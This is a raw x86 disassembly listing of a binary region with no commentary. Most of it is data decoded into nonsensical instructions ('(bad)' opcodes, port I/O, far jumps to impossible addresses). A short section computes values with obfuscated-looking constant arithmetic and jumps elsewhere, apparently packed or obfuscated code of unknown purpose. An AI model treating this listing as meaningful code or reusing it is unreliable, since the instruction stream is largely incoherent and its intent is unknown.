  423eaa:	in     al,dx
  423eab:	mov    eax,0xe4dbf0f5
  423eb0:	mov    esp,0xc7e0d5d6
  423eb5:	add    eax,0xd9cee2dd
  423eba:	in     eax,dx
  423ebb:	mov    eax,0xe1c9c1c0
  423ec0:	mov    bh,0xe3
  423ec2:	int    0xec
  423ec4:	mov    ecx,0xd4b7b7f2
  423ec9:	jmp    0xbcf2:0xd6dcfddb
  423ed0:	std    
  423ed1:	mov    esp,0xddfac3fa
  423ed6:	call   0xce2407be
  423edb:	jmp    0xc7f005a5
  423ee0:	fmul   st(3),st
  423ee2:	cli    
  423ee3:	loope  0x423edd
  423ee5:	fprem  
  423ee7:	(bad)  
  423ee8:	fstp   st(7)
  423eea:	add    esi,esp
  423eec:	loopne 0x423ec4
  423eee:	out    dx,al
  423eef:	ret    0xd600
  423ef2:	mov    esp,0xe201e9ea
  423ef7:	fsubrp st(7),st
  423ef9:	pop    es
  423efa:	fild   QWORD PTR [ecx-0xd0f3854]
  423f00:	shl    edx,1
  423f02:	sar    edx,0xb5
  423f05:	mov    al,0xbf
  423f07:	mov    ecx,0xd1cdd2de
  423f0c:	enter  0xe6ef,0xf4
  423f10:	(bad)  
  423f11:	icebp  
  423f12:	fdecstp 
  423f14:	mov    BYTE PTR ds:0xe2ef0ace,0xf9
  423f1b:	mov    ebp,0xcdadeaaa
  423f20:	repnz shl cl,cl
  423f23:	in     eax,dx
  423f24:	iret   
  423f25:	mov    cl,0xda
  423f27:	hlt    
  423f28:	fiadd  WORD PTR [ebx]
  423f2a:	call   0xd31b22f0
  423f2f:	mov    esi,0xe7c7c2e7
  423f34:	(bad)  
  423f35:	loop   0x423f3d
  423f37:	cmc    
  423f38:	jmp    0xf2b0:0xa8ad0205
  423f3f:	mov    dl,0xd1
  423f41:	retf   
  423f42:	mov    ebx,0xb8e7d0c5
  423f47:	(bad)  
  423f49:	jmp    0x81e0750
  423f4e:	out    0xbd,eax
  423f50:	test   esi,0xa08dee0
  423f56:	or     ecx,edx
  423f58:	aam    0xc1
  423f5a:	std    
  423f5b:	mov    eax,0xc5e6d1a8
  423f60:	(bad)  
  423f61:	(bad)
  423f64:	mov    eax,0xccfeebc8
  423f69:	into   
  423f6a:	fld    QWORD PTR [edx]
  423f6c:	out    0xf9,eax
  423f6e:	sar    DWORD PTR [ebx-0xafa43f5],0xdf
  423f75:	sti    
  423f76:	dec    DWORD PTR [ecx]
  423f78:	add    ecx,DWORD PTR [edi]
  423f7a:	iret   
  423f7b:	sar    BYTE PTR [ebp+eiz*8-0x37430e3c],1
  423f82:	mov    ah,0xef
  423f84:	shr    ch,1
  423f86:	icebp  
  423f87:	mov    ah,0xf5
  423f89:	jecxz  0x423f65
  423f8b:	loopne 0x423f79
  423f8d:	into   
  423f8e:	(bad)  
  423f8f:	in     al,0xda
  423f91:	lock loop 0x423f9f
  423f94:	std    
  423f95:	aam    0xc4
  423f97:	push   es
  423f98:	cld    
  423f99:	in     al,0x7
  423f9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423f9c:	test   al,0xdf
  423f9e:	repnz loope 0x423f6f
  423fa1:	(bad)
  423fa5:	xlat   BYTE PTR ds:[ebx]
  423fa6:	retf   0xf1fb
  423fa9:	xlat   BYTE PTR ds:[ebx]
  423faa:	ret    0x1b7
  423fad:	out    dx,al
  423fae:	aad    0xc6
  423fb0:	repz shl dh,cl
  423fb3:	out    0xd9,eax
  423fb5:	fxch   st(0)
  423fb7:	jmp    0x423f87
  423fb9:	clc    
  423fba:	jecxz  0x423f8b
  423fbc:	loope  0x423f67
  423fbe:	mov    cl,0xca
  423fc0:	lock ret 0xe8fb
  423fc4:	mov    ch,0xb5
  423fc6:	ror    ch,1
  423fc8:	mov    esp,0xc2e1ccda
  423fcd:	add    esi,ebx
  423fcf:	in     eax,dx
  423fd0:	cli    
  423fd1:	(bad)  
  423fd2:	add    esp,ebp
  423fd4:	add    DWORD PTR [esi],eax
  423fd6:	test   dh,0xf
  423fd9:	retf   0xabd8
  423fdc:	call   0xdd2e1592
  423fe1:	lods   eax,DWORD PTR ds:[esi]
  423fe2:	out    dx,al
  423fe3:	mov    dl,0xd4
  423fe5:	mov    al,0xd0
  423fe7:	sar    ch,cl
  423fe9:	fsub   st(7),st
  423feb:	jmp    0xc00202ec
  423ff0:	add    ah,al
  423ff2:	or     dh,cl
  423ff4:	ffreep st(6)
  423ff6:	add    bh,ah
  423ff8:	clc    
  423ff9:	fsubr  st(7),st
  423ffb:	mov    dl,0xc9
  423ffd:	shl    edi,0xed
  424000:	icebp  
  424001:	ret    0xb7d1
  424004:	retf   
  424005:	(bad)  [esi+0x3c8fbd1]
  42400b:	(bad)  
  42400d:	in     eax,dx
  42400e:	shl    ebp,1
  424010:	xlat   BYTE PTR ds:[ebx]
  424011:	shl    dl,0xfb
  424014:	aad    0x8
  424016:	jmp    0x42400c
  424018:	jecxz  0x423ff8
  42401a:	add    eax,0xa4b2eec4
  42401f:	jecxz  0x423ff6
  424021:	mov    dl,0xaf
  424024:	stc    
  424025:	lods   eax,DWORD PTR ds:[esi]
  424026:	clc    
  424027:	cld    
  424028:	out    dx,al
  424029:	sti    
  42402a:	(bad)  
  42402c:	add    esi,DWORD PTR [ebp-0x3d3bfd2a]
  424032:	mov    eax,0xfaf5f0f8
  424037:	(bad)  
  424039:	add    edx,ebp
  42403b:	call   0xe2302c1e
  424040:	mov    cl,0xc2
  424042:	mov    ebx,0xdad0e7d9
  424047:	(bad)  
  424049:	test   ah,0xd5
  42404c:	fild   DWORD PTR [edi]
  42404e:	shl    dl,1
  424050:	aad    0xe0
  424052:	(bad)  
  424053:	retf   
  424054:	aam    0xda
  424056:	leave  
  424057:	out    0x0,eax
  424059:	jecxz  0x42401b
  42405b:	fxch   st(0)
  42405d:	(bad)  
  42405e:	out    0xcb,al
  424060:	sti    
  424061:	(bad)  
  424062:	out    0xf7,al
  424064:	int    0xe5
  424066:	(bad)  
  424068:	mov    esi,0xd0d3efdc
  42406d:	loopne 0x424056
  42406f:	fcomip st,st(2)
  424071:	rol    DWORD PTR ds:0xe0c9db00,cl
  424077:	(bad)  
  424078:	in     eax,dx
  424079:	or     bh,ch
  42407b:	shr    bl,0xbd
  42407e:	aad    0xf4
  424080:	not    bl
  424082:	call   0xdb17335c
  424087:	mov    ebx,0xf3d3bff3
  42408c:	out    dx,al
  42408d:	(bad)  
  42408e:	in     eax,dx
  42408f:	aad    0xd1
  424091:	fnstsw ax
  424093:	(bad)  
  424094:	sar    ah,1
  424096:	add    al,0xc
  424098:	leave  
  424099:	or     dl,ch
  42409b:	jmp    0x424065
  42409d:	imul   esi
  42409f:	out    0xce,eax
  4240a1:	mov    dl,0xeb
  4240a3:	jmp    0x42406b
  4240a5:	(bad)  
  4240a6:	sti    
  4240a7:	idiv   bl
  4240a9:	neg    bh
  4240ab:	fcmovb st,st(3)
  4240ad:	mov    esi,0xf6c6d0c6
  4240b2:	jmp    0x4240b9
  4240b4:	ret    0xffe2
  4240b7:	or     bh,bh
  4240b9:	or     dh,bh
  4240bb:	mov    edi,0xb6b3afa8
  4240c0:	rcl    bh,0xe5
  4240c3:	mov    edx,0xf6ccb7bb
  4240c8:	mov    ecx,0x8b535cb
  4240cd:	push   ecx
  4240ce:	pop    es
  4240cf:	add    eax,0x3272fb
  4240d4:	mov    DWORD PTR [ebp-0x80],eax
  4240d7:	jmp    0x4240f1
  4240dc:	mov    eax,DWORD PTR [ebp+0xc]
  4240df:	xor    eax,0x75108b5
  4240e4:	mov    ecx,DWORD PTR [ebp-0x80]
  4240e7:	lea    eax,[ecx+eax*1+0x3272fb]
  4240ee:	mov    DWORD PTR [ebp-0x80],eax
  4240f1:	mov    eax,DWORD PTR [ebp-0x80]
  4240f4:	jmp    0x42649a
  4240f9:	sub    BYTE PTR [edx+esi*4+0x3a],bl
  4240fd:	not    BYTE PTR [eax+esi*2+0x6c]
  424101:	push   esi
  424102:	je     0x4240ee
  424104:	hlt    
  424105:	push   ebp
  424106:	add    al,0x56
  424108:	mov    bl,0xe4
  42410a:	fs jp  0x424188
  42410d:	add    bl,BYTE PTR [eax-0x64b8485]
  424113:	loope  0x4240f1
  424115:	out    0xe3,al
  424117:	mov    edx,0xd7d7d8c0
  42411c:	add    bh,ch
  42411e:	fadd   DWORD PTR ds:0xe7cf0dc4
  424124:	(bad)  
  424126:	leave  
  424127:	hlt    
  424128:	xlat   BYTE PTR ds:[ebx]
  424129:	loopne 0x4240f7
  42412b:	out    0xb6,eax
  42412d:	in     eax,0xfe
  42412f:	clc    
  424130:	mov    eax,0xc3d5d5c9
  424135:	clc    
  424136:	(bad)  
  424137:	mov    esp,0x3c1dbe3
  42413c:	inc    DWORD PTR [ecx]
  42413e:	xabort 0xdf
  424141:	retf   
  424142:	fadd   st(3),st
  424144:	loopne 0x424124
  424146:	out    dx,al
  424147:	mov    bl,0xc3
  424149:	shl    esp,cl
  42414b:	mov    ecx,0xf2bebff2
  424150:	add    ah,cl
  424152:	icebp  
  424153:	loope  0x42414d
  424155:	mov    esi,0xfef7c1fb
  42415a:	sti    
  42415b:	jmp    0xb1e2a34
  424160:	fmul   st,st(2)
  424162:	(bad)  
  424164:	loope  0x424138
  424166:	mov    esp,0xb5f1cab0
  42416b:	in     eax,dx
  42416c:	mov    ecx,0xd5f8c4b9
  424171:	rcr    cl,cl
  424173:	repz fnstsw WORD PTR [edi-0x91f002c]
  42417a:	aad    0xea
  42417c:	cld    
  42417d:	enter  0xfd0e,0xd9
  424181:	adc    ecx,edx
  424183:	in     al,0xbd
  424185:	retf   
  424186:	ror    dh,0xea
  424189:	mov    cl,0xcb
  42418b:	jmp    0xfdef:0xd5bac9ca
  424192:	fiadd  DWORD PTR [edx]
  424194:	aad    0xf1
  424196:	fsubr  st(3),st
  424198:	fistp  QWORD PTR [eax+0x5eee0e8]
  42419e:	or     al,0xea
  4241a0:	loope  0x42419f
  4241a2:	faddp  st(1),st
  4241a4:	rcr    dh,1
  4241a6:	mov    cl,0xf7
  4241a8:	jmp    0x424180
  4241aa:	ror    bh,0xd5
  4241ad:	sti    
  4241ae:	mov    dh,0xd4
  4241b0:	aam    0xbd
  4241b2:	out    dx,eax
  4241b3:	(bad)  
  4241b4:	fcomip st,st(6)
  4241b6:	ret    
  4241b7:	rol    dh,cl
  4241b9:	shl    al,cl
  4241bb:	hlt    
  4241bc:	fucomip st,st(2)
  4241be:	fmul   st(5),st
  4241c0:	shr    ebp,cl
  4241c2:	lods   al,BYTE PTR ds:[esi]
  4241c3:	lods   al,BYTE PTR ds:[esi]
  4241c4:	test   al,0xf1
  4241c6:	retf   0xc5cb
  4241c9:	rcl    cl,1
  4241cb:	cmc    
  4241cc:	(bad)  
  4241cd:	dec    eax
  4241cf:	(bad)  
  4241d0:	(bad)  
  4241d2:	mov    ebx,0x3d3bdd8
  4241d7:	ror    ebx,cl
  4241d9:	fld    st(1)
  4241db:	fsub   st,st(1)
  4241dd:	(bad)  
  4241de:	std    
  4241df:	out    0xf8,al
  4241e1:	rol    ecx,cl
  4241e3:	(bad)  
  4241e4:	mov    bh,0xf3
  4241e6:	mul    bl
  4241e8:	mov    dh,0xf2
  4241ea:	enter  0xb4da,0xce
  4241ee:	fucomi st,st(3)
  4241f0:	into   
  4241f1:	mov    edi,0xdedcbcdc
  4241f6:	fcmovnu st,st(1)
  4241f8:	repz rcr ebx,1
  4241fb:	(bad)  
  4241fd:	pop    es
  4241fe:	fcomi  st,st(3)
  424200:	pmaxsw mm5,mm0
  424203:	jmp    0x4241ad
  424205:	fdivrp st(1),st
  424207:	out    0xc9,al
  424209:	int3   
  42420a:	(bad)  [ebp-0x4d00280c]
  424210:	loop   0x424215
  424212:	mov    ecx,0xf8f2e1dc
  424217:	ret    
  424218:	rcr    esp,0xf9
  42421b:	ret    0xc9f5
  42421e:	(bad)  
  42421f:	(bad)  
  424221:	loopne 0x424208
  424223:	icebp  
  424224:	loopne 0x4241e7
  424226:	test   esi,0xb8b6f4e3
  42422c:	in     al,0xbb
  42422e:	repz in eax,dx
  424230:	cmc    
  424231:	add    esi,esi
  424233:	mov    esp,0x1d7d1da
  424238:	not    ecx
  42423a:	call   0xec3c211c
  42423f:	out    0xf2,eax
  424241:	rol    ebp,cl
  424243:	jmp    0xeeb3:0xd4b2c7e9
  42424a:	shl    dh,1
  42424c:	enter  0xfafb,0xbd
  424250:	fsub   st,st(2)
  424252:	in     al,dx
  424253:	clc    
  424254:	iret   
  424255:	shl    ch,cl
  424257:	(bad)  
  424258:	sar    BYTE PTR [edi+edx*8-0x1f91800],cl
  42425f:	or     al,0xe6
  424261:	retf   0xace6
  424264:	(bad)  
  424265:	mov    al,0xef
  424267:	in     al,0xb2
  424269:	cli    
  42426a:	jmp    0x424231
  42426c:	aad    0xba
  42426e:	(bad)  
  42426f:	iret   
  424270:	mov    edx,0xe1be01ce
  424275:	sti    
  424276:	rol    ch,0xbd
  424279:	jmp    esp
  42427b:	aad    0xe3
  42427d:	fisttp WORD PTR ds:0xebd30ad8
  424283:	mov    eax,0xe0c4caef
  424288:	in     al,dx
  424289:	jmp    0xd4cd:0xaccbbbee
  424290:	std    
  424291:	in     al,dx
  424292:	neg    ebp
  424294:	fcomip st,st(2)
  424296:	clc    
  424297:	neg    cl
  424299:	add    ebp,edi
  42429b:	inc    BYTE PTR [ebx]
  42429d:	in     eax,0xb
  42429f:	enter  0xd2c4,0xcf
  4242a3:	out    0xe4,al
  4242a5:	shl    eax,0xdc
  4242a8:	sti    
  4242a9:	mov    al,0xb7
  4242ab:	cmc    
  4242ac:	retf   0xffd9
  4242af:	(bad)  
  4242b1:	in     eax,dx
  4242b2:	(bad)  
  4242b4:	out    0x6,al
  4242b6:	cli    
  4242b7:	loop   0x4242b8
  4242b9:	div    eax
  4242bb:	out    0xf7,eax
  4242bd:	loop   0x4242a3
  4242bf:	ret    0xccf3
  4242c2:	rcl    ebx,cl
  4242c4:	leave  
  4242c5:	ret    0xd0ed
  4242c8:	aam    0xb4
  4242ca:	(bad)  
  4242cb:	mov    cl,0xf6
  4242cd:	mov    bh,0xba
  4242cf:	out    dx,eax
  4242d0:	in     eax,dx
  4242d1:	xlat   BYTE PTR ds:[ebx]
  4242d2:	out    dx,eax
  4242d3:	mov    edx,0xfec5d2cf
  4242d8:	rol    eax,1
  4242da:	sar    bh,0x0
  4242dd:	test   dh,0xb
  4242e0:	call   0xeb332dde
  4242e5:	call   0xf10627bc
  4242ea:	loope  0x4242c3
  4242ec:	sti    
  4242ed:	sar    edi,1
  4242ef:	add    ebp,esp
  4242f1:	call   0xf5204aec
  4242f6:	add    edx,esp
  4242f8:	fdivr  st,st(3)
  4242fa:	add    eax,ebp
  4242fc:	push   es
  4242fd:	loopne 0x4242e6
  4242ff:	retf   0xf90d
  424302:	fsub   st(6),st
  424304:	fsubr  QWORD PTR [edx+ecx*8-0x30311c49]
  42430b:	test   ah,0xc5
  42430e:	jmp    0xd1cc:0xb8fbc9d0
  424315:	ret    0xdbbe
  424318:	std    
  424319:	mov    esp,0x9c6f9ff
  42431e:	hlt    
  42431f:	or     edx,DWORD PTR [ebx]
  424321:	leave  
  424322:	test   al,0xca
  424324:	mov    cl,0xd6
  424326:	fadd   st(7),st
  424328:	shl    dl,1
  42432a:	(bad)  
  42432b:	mov    al,0xd4
  42432d:	mov    dh,0xee
  42432f:	fadd   QWORD PTR [ebx]
  424331:	(bad)  
  424332:	call   0xe315fc32
  424337:	add    ebx,ebp
  424339:	retf   0xfe2
  42433c:	call   0xce4a182e
  424341:	clc    
  424342:	mov    eax,0xbcc3dfc2
  424347:	icebp  
  424348:	out    0xc8,al
  42434a:	leave  
  42434b:	mov    edx,0xb5dfcfdf
  424350:	int    0xbe
  424352:	stc    
  424353:	in     al,dx
  424354:	add    al,dh
  424356:	pop    es
  424357:	jecxz  0x42434e
  424359:	pop    es
  42435a:	or     DWORD PTR [edi],eax
  42435c:	in     eax,0xe6
  42435e:	jmp    0x424373
  424360:	repz pop es
  424362:	out    0xc9,al
  424364:	lods   eax,DWORD PTR ds:[esi]
  424365:	jmp    0x42434d
  424367:	not    bl
  424369:	test   al,0xc8
  42436b:	iret   
  42436c:	ror    esi,cl
  42436e:	jmp    0x42435b
  424370:	aad    0xed
  424372:	sti    
  424373:	int3   
  424374:	repz fcmovnb st,st(7)
  424377:	jmp    0x42435d
  424379:	or     DWORD PTR [esi],eax
  42437b:	xlat   BYTE PTR ds:[ebx]
  42437c:	mov    BYTE PTR [edi],0x0
  42437f:	int3   
  424380:	add    edi,edi
  424382:	loopne 0x424331
  424384:	into   
  424385:	out    dx,eax
  424386:	out    dx,al
  424387:	iret   
  424388:	int3   
  424389:	lods   al,BYTE PTR ds:[esi]
  42438a:	in     eax,0xb6
  42438c:	fnstenv [ebp+esi*4-0x4360c]
  424393:	std    
  424394:	int    0x2
  424396:	fld    st(4)
  424398:	les    edi,FWORD PTR [eax-0x27f9162a]
  42439e:	out    0xc2,eax
  4243a0:	fxch   st(0)
  4243a2:	lods   eax,DWORD PTR ds:[esi]
  4243a3:	iret   
  4243a4:	mov    bh,0xb3
  4243a6:	mov    esp,0xc9e1e2db
  4243ab:	retf   0xdaeb
  4243ae:	mov    bh,0xe3
  4243b0:	loop   0x4243b4
  4243b2:	fucom  st(1)
  4243b4:	ror    ebp,cl
  4243b6:	jecxz  0x4243bc
  4243b8:	pop    es
  4243b9:	fadd   QWORD PTR [esi]
  4243bb:	leave  
  4243bc:	fcmovnu st,st(2)
  4243be:	add    eax,0xe6e5eadd
  4243c3:	shr    edi,0xe6
  4243c6:	call   0xb634f0c0
  4243cb:	jmp    0x4243c2
  4243cd:	mov    esi,0xcdbfecb7
  4243d2:	mov    edi,0xe6c7d5c2
  4243d7:	mov    BYTE PTR [eax],0xf4
  4243da:	or     esp,eax
  4243dc:	or     dl,ah
  4243de:	retf   0xc9e6
  4243e1:	out    0xc4,eax
  4243e3:	mov    dl,0xd7
  4243e5:	out    0xbd,eax
  4243e7:	jecxz  0x4243ac
  4243e9:	aad    0xf4
  4243eb:	xlat   BYTE PTR ds:[ebx]
  4243ec:	fdivrp st(0),st
  4243ee:	sar    dh,1
  4243f0:	(bad)  
  4243f1:	loope  0x4243d4
  4243f3:	out    dx,eax
  4243f4:	std    
  4243f5:	repz int 0xe6
  4243f8:	ffreep st(1)
  4243fa:	ret    0x6e2
  4243fd:	cli    
  4243fe:	(bad)  
  4243ff:	fcmovne st,st(6)
  424401:	clc    
  424402:	in     eax,dx
  424403:	test   eax,0xc4c7c7f2
  424408:	shl    esi,1
  42440a:	mul    al
  42440c:	mov    dh,0xdb
  42440e:	iret   
  42440f:	jmp    0xc2133b03
  424414:	jmp    ebp
  424416:	(bad)  
  424418:	(bad)  
  424419:	xlat   BYTE PTR ds:[ebx]
  42441a:	sti    
  42441b:	call   0xeb441de9
  424420:	clc    
  424421:	in     al,dx
  424422:	out    dx,eax
  424423:	repnz fucomip st,st(7)
  424426:	shl    esi,cl
  424428:	repnz loop 0x424421
  42442b:	mov    ecx,0xcbb4c4fb
  424430:	cmc    
  424431:	into   
  424432:	add    dh,bl
  424434:	mov    edi,0xf800c001
  424439:	icebp  
  42443a:	or     DWORD PTR [esi],eax
  42443c:	psadbw mm3,mm2
  42443f:	jmp    0xcfd3:0xecdce303
  424446:	stos   DWORD PTR es:[edi],eax
  424447:	mov    ch,0xd5
  424449:	cli    
  42444a:	call   0xe0081005
  42444f:	shr    ah,1
  424451:	(bad)  
  424453:	ret    
  424454:	icebp  
  424455:	mov    edi,0xdc01dbff
  42445a:	fcomip st,st(5)
  42445c:	hlt    
  42445d:	(bad)  
  42445f:	sti    
  424460:	fld    DWORD PTR ds:0xc2f0d3af
  424466:	mov    bl,0xb4
  424468:	ret    
  424469:	out    dx,al
  42446a:	(bad)
  42446d:	cli    
  42446e:	dec    ebx
  424470:	call   0xce033a47
  424475:	cli    
  424476:	rcr    ecx,0x0
  424479:	(bad)  [edx]
  42447b:	std    
  42447c:	sti    
  42447d:	jecxz  0x424443
  42447f:	sti    
  424480:	or     eax,DWORD PTR [ebx]
  424482:	rcl    ecx,1
  424484:	retf   0xddb7
  424487:	jecxz  0x42447c
  424489:	aad    0xf3
  42448b:	mov    edx,0xbbf6cde8
  424490:	int    0xf2
  424492:	test   eax,0xdd01f3c2
  424498:	ret    0xfaf5
  42449b:	add    eax,0xd8e106fc
  4244a0:	sti    
  4244a1:	out    0xcb,al
  4244a3:	jecxz  0x424477
  4244a5:	fst    st(0)
  4244a7:	rcl    dh,cl
  4244a9:	hlt    
  4244aa:	clc    
  4244ab:	(bad)  
  4244ac:	fdivp  st(7),st
  4244ae:	enter  0xf1c4,0xcc
  4244b2:	repnz clc 
  4244b4:	mov    edi,0xe0e3bcfc
  4244b9:	or     eax,ecx
  4244bb:	xlat   BYTE PTR ds:[ebx]
  4244bc:	jecxz  0x4244cd
  4244be:	cmc    
  4244bf:	jmp    0xc1e4:0xf2ad000b
  4244c6:	cmc    
  4244c7:	repnz mov ah,0xd1
  4244ca:	mov    bh,0xed
  4244cc:	out    0xf7,eax
  4244ce:	dec    dl
  4244d0:	mov    esp,0xd3c102d6
  4244d5:	loop   0x4244bc
  4244d7:	(bad)  
  4244d8:	out    0x4,eax
  4244da:	hlt    
  4244db:	stc    
  4244dc:	stc    
  4244dd:	push   es
  4244de:	add    BYTE PTR [eax+ebx*8],al
  4244e1:	icebp  
  4244e2:	ffree  st(7)
  4244e4:	jmp    0xd83937ca
  4244e9:	out    0xc4,eax
  4244eb:	jmp    0x4244b7
  4244ed:	in     eax,dx
  4244ee:	cmc    
  4244ef:	idiv   BYTE PTR [ecx-0x3827472c]
  4244f5:	rcl    ecx,0xe5
  4244f8:	dec    BYTE PTR [ebx]
  4244fa:	retf   0xdcf9
  4244fd:	ffree  st(3)
  4244ff:	stc    
  424500:	retf   
  424501:	out    dx,al
  424502:	shr    ch,0xbc
  424505:	scas   al,BYTE PTR es:[edi]
  424506:	in     al,0xf5
  424508:	ret    
  424509:	mov    bh,0xfa
  42450b:	retf   0xf1f5
  42450e:	jmp    0xe6bf:0xdfdbc3bc
  424515:	out    dx,al
  424516:	fst    st(2)
  424518:	mov    esp,0xf8d404e9
  42451d:	out    dx,eax
  42451e:	ret    
  42451f:	add    eax,ebp
  424521:	or     eax,edx
  424523:	icebp  
  424524:	(bad)  
  424525:	out    0xeb,eax
  424527:	call   0xe63e2ff0
  42452c:	out    dx,al
  42452d:	(bad)  
  42452e:	fnstsw WORD PTR [eax-0x45302e01]
  424534:	clc    
  424535:	stc    
  424536:	rol    ch,cl
  424538:	inc    ebx
  42453a:	jecxz  0x424526
  42453c:	fld    QWORD PTR [eax+eax*1]
  42453f:	jmp    0xa8f3:0xe8ede2e8
  424546:	ret    
  424547:	int    0xf0
  424549:	hlt    
  42454a:	fld    st(5)
  42454c:	mov    cl,0xe4
  42454e:	out    dx,al
  42454f:	cld    
  424550:	mov    esi,0xf3d2d1f4
  424555:	(bad)  
  424556:	rol    ebp,cl
  424558:	mov    eax,0xfa0af5e3
  42455e:	iret   
  42455f:	fstp   st(5)
  424561:	(bad)
  424565:	ret    
  424566:	xlat   BYTE PTR ds:[ebx]
  424567:	out    0xe3,eax
  424569:	iret   
  42456a:	mov    bl,0xb4
  42456c:	mov    cl,0xfe
  42456e:	mov    dh,0xcd
  424570:	(bad)  
  424572:	cli    
  424573:	shr    ch,1
  424575:	aam    0xde
  424577:	mov    edx,0xc502c1dd
  42457c:	shl    ebp,0xe8
  42457f:	or     eax,esp
  424581:	in     eax,0xa7
  424583:	mov    bl,0xbd
  424585:	scas   eax,DWORD PTR es:[edi]
  424586:	rcl    al,1
  424588:	retf   
  424589:	mov    bl,0xe5
  42458b:	hlt    
  42458c:	mov    ebx,0xf1d7d0e9
  424591:	(bad)  
  424593:	cli    
  424594:	cli    
  424595:	icebp  
  424596:	stc    
  424597:	ret    
  424598:	loopne 0x424591
  42459a:	add    edi,edx
  42459c:	add    bh,bh
  42459e:	loopne 0x4245a5
  4245a0:	or     ecx,DWORD PTR [esi]
  4245a2:	lods   al,BYTE PTR ds:[esi]
  4245a3:	enter  0xccf1,0xf6
  4245a7:	sar    dl,1
  4245a9:	cmc    
  4245aa:	leave  
  4245ab:	imul   cl
  4245ad:	jmp    0x424593
  4245af:	out    dx,al
  4245b0:	repz into 
  4245b2:	hlt    
  4245b3:	iret   
  4245b4:	fiadd  WORD PTR [edx]
  4245b6:	(bad)  
  4245b8:	(bad)  
  4245b9:	jmp    0xfb080e81
  4245be:	in     al,dx
  4245bf:	cld    
  4245c0:	jmp    0xae2a2bb6
  4245c5:	shl    BYTE PTR [ecx-0xb043636],cl
  4245cb:	shr    BYTE PTR [ebp-0x1312d18],cl
  4245d1:	fdivr  QWORD PTR [esi-0x3d22192b]
  4245d7:	mov    esi,0xe0d6c0c7
  4245dc:	hlt    
  4245dd:	inc    dh
  4245df:	fdiv   st(6),st
  4245e1:	add    al,0xd8
  4245e3:	mov    esi,0xb0e5e6de
  4245e8:	(bad)  
  4245ea:	sar    eax,0xd6
  4245ed:	(bad)  
  4245ee:	cmc    
  4245ef:	cmc    
  4245f0:	aam    0xf2
  4245f2:	repz fidivr DWORD PTR [esi-0x3ffd28fb]
  4245f9:	jmp    0xb4c3bbe
  4245fe:	out    dx,eax
  4245ff:	(bad)  
  424601:	cld    
  424602:	(bad)  
  424604:	repnz loopne 0x4245ed
  424607:	aad    0xe4
  424609:	vaddsubpd ymm5,ymm2,ymm3
  42460d:	(bad)  
  42460f:	mov    ebp,0xc9babf
  424614:	fild   DWORD PTR [eax]
  424616:	fcmovnu st,st(2)
  424618:	mov    ecx,0xdfc0fce5
  42461d:	ror    BYTE PTR ds:0xafcd01e3,0xeb
  424624:	in     al,0xb7
  424626:	hlt    
  424627:	(bad)  
  424628:	sti    
  424629:	lods   al,BYTE PTR ds:[esi]
  42462a:	mov    ecx,0xdcc5e8b4
  42462f:	int    0xfe
  424631:	(bad)  
  424633:	ret    0xe7b8
  424636:	in     al,0xbe
  424638:	or     al,BYTE PTR [edx]
  42463a:	mul    ecx
  42463c:	iret   
  42463d:	out    0xfb,al
  42463f:	in     al,0xca
  424641:	or     DWORD PTR [esi-0x141e533a],edi
  424647:	in     eax,0xe2
  424649:	(bad)  
  42464a:	retf   0xdfea
  42464d:	not    ah
  42464f:	fidivr WORD PTR [ecx+esi*8-0x1d384743]
  424656:	add    bh,bl
  424658:	cld    
  424659:	mov    DWORD PTR [ebx+ecx*1],0xdcfccbe4
  424660:	cli    
  424661:	retf   0xc9c5
  424664:	loop   0x424619
  424666:	jmp    0xc7da:0xe4dbd1c4
  42466d:	in     al,0xbd
  42466f:	leave  
  424670:	iret   
  424671:	loope  0x424674
  424673:	iret   
  424674:	jecxz  0x424634
  424676:	add    eax,0xe5e9f5ba
  42467b:	(bad)  
  42467c:	loopne 0x42463a
  42467e:	into   
  42467f:	loope  0x424659
  424681:	icebp  
  424682:	mov    eax,0xb7c0e1e9
  424687:	shl    dh,0xc9
  42468a:	(bad)  
  42468b:	out    0xb1,eax
  42468d:	rcr    al,1
  42468f:	stc    
  424690:	stc    
  424691:	sti    
  424692:	faddp  st(3),st
  424694:	xlat   BYTE PTR ds:[ebx]
  424695:	cli    
  424696:	out    0x2,al
  424698:	rcl    edx,0xe4
  42469b:	jecxz  0x424692
  42469d:	add    ebx,ecx
  42469f:	repz loopne 0x424674
  4246a2:	mov    eax,0xb6e3c8bc
  4246a7:	retf   
  4246a8:	test   eax,0xe8d9efe4
  4246ad:	(bad)  
  4246ae:	call   0xc4423a6e
  4246b3:	clc    
  4246b4:	(bad)  
  4246b5:	fcmovb st,st(7)
  4246b7:	test   BYTE PTR [eax],0xe0
  4246ba:	or     esi,esi
  4246bc:	(bad)  
  4246bf:	push   es
  4246c0:	out    0xc4,al
  4246c2:	in     eax,0xc4
  4246c4:	lods   eax,DWORD PTR ds:[esi]
  4246c5:	mov    esp,0xe1e4e7e6
  4246ca:	sar    dl,cl
  4246cc:	mov    al,0xfe
  4246ce:	ror    ah,cl
  4246d0:	retf   0xfaf8
  4246d3:	out    0xcf,eax
  4246d5:	(bad)  
  4246d6:	loopne 0x4246de
  4246d8:	clc    
  4246d9:	xlat   BYTE PTR ds:[ebx]
  4246da:	aam    0xd0
  4246dc:	xlat   BYTE PTR ds:[ebx]
  4246dd:	retf   
  4246de:	fsub   st,st(0)
  4246e0:	cli    
  4246e1:	push   cs
  4246e2:	lods   al,BYTE PTR ds:[esi]
  4246e3:	mov    esp,0xecc8cdb1
  4246e8:	into   
  4246e9:	cmc    
  4246ea:	out    dx,al
  4246eb:	iret   
  4246ec:	into   
  4246ed:	repz clc 
  4246ef:	mov    dl,0xda
  4246f1:	retf   0xd1e9
  4246f4:	fld    QWORD PTR [eax]
  4246f6:	mov    ebx,0xe1ddc2ba
  4246fb:	xlat   BYTE PTR ds:[ebx]
  4246fc:	out    dx,eax
  4246fd:	pop    es
  4246fe:	psubd  mm4,mm0
  424701:	fnsave [ebx-0x3f233a1d]
  424707:	call   0xdb2c1dcd
  42470c:	repz mov ebx,0xb4fa03f0
  424712:	sti    
  424713:	int3   
  424714:	aad    0xf6
  424716:	cmc    
  424717:	shl    dh,cl
  424719:	jmp    0xd8e5:0xca080004
  424720:	out    dx,al
  424721:	or     ah,bl
  424723:	loopne 0x4246f0
  424725:	imul   bh
  424727:	mov    bl,0xfa
  424729:	in     eax,0xb3
  42472b:	cmc    
  42472c:	mov    al,0xd1
  42472e:	hlt    
  42472f:	mov    ecx,0xecf2e2ee
  424734:	loopne 0x424737
  424736:	pop    es
  424737:	push   es
  424738:	(bad)  
  424739:	fimul  DWORD PTR [ecx]
